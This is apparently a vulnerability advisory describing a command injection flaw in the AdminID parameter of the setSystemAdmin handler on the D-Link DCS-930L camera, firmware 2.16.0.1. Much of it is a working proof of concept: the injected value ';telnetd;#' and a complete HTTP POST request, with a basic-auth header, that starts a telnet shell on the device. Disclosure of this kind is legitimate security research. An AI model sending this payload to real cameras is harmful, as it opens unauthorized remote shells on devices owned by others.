**Affected Product**: D-Link DCS930L

**Affected Firmware Versions**:  2.16.0.1

**Vulnerability Type**: Command Execution


------
### **Vulnerability Description**

A command injection vulnerability exists in the setSystemAdmin function of the alphapd binary in D-Link DCS-930L firmware v2.16.0.1. The AdminID parameter is directly taken from user input and inserted into shell commands without proper sanitization, allowing remote attackers to execute arbitrary OS commands via crafted requests. Vulnerable devices may include D‑Link DCS‑930L units running firmware v2.16.0.1 or earlier.


---
### **Vulnerability Details**

![image-1](./img/1.png)
Within the `setSystemAdmin` handler in the `alphapd` binary, the `AdminID` value is sourced directly from attacker-controlled input and is subsequently interpolated into shell commands without proper sanitization or escaping. This makes it possible for an attacker to craft an `AdminID` that triggers arbitrary command execution.

---
### **PoC**
Just set `AdminID` as **';telnetd;#** , and the device will excute it,such as:

```
POST /setSystemAdmin HTTP/1.1
Host: 192.168.0.163
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 330
Origin: http://192.168.0.163
Authorization: Basic YWRtaW46
Connection: close
Referer: http://192.168.0.163/advanced.htm
Upgrade-Insecure-Requests: 1
Priority: u=0, i

ReplySuccessPage=advanced.htm&ReplyErrorPage=errradv.htm&AdminID=';telnetd;#&UserID1=&UserID2=&UserID3=&UserID4=&UserID5=&UserID6=&UserID7=&UserID8=&AdminPassword=539a63634c9a634a9a63cfc3635b0563c79a6363c39a63969a6323c363c30563c79a6363c39a63969a6323c363c30563c79a6363c39a63969a6323c363c30563&SessionKey=1325376377&ConfigSystemAdmin=Save
```

Get a shell!
![image-2](./img/2.png)
